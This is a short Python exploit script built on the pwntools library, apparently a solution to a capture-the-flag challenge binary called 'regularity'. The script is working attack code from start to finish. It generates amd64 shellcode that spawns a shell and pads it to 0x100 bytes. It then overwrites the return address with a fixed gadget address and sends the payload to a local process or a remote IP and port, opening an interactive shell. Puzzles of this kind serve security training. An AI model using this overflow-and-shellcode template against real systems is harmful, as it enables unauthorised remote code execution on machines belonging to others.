from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./regularity"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("94.237.48.12", 45638)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

shellcode = asm(shellcraft.amd64.linux.sh())

payload = shellcode.ljust(0x100, b"\x00") + p64(0x0401041)
ddebug("break *0x40106e\ncontinue")
io.sendafter("new these days?\n", payload)

io.interactive()
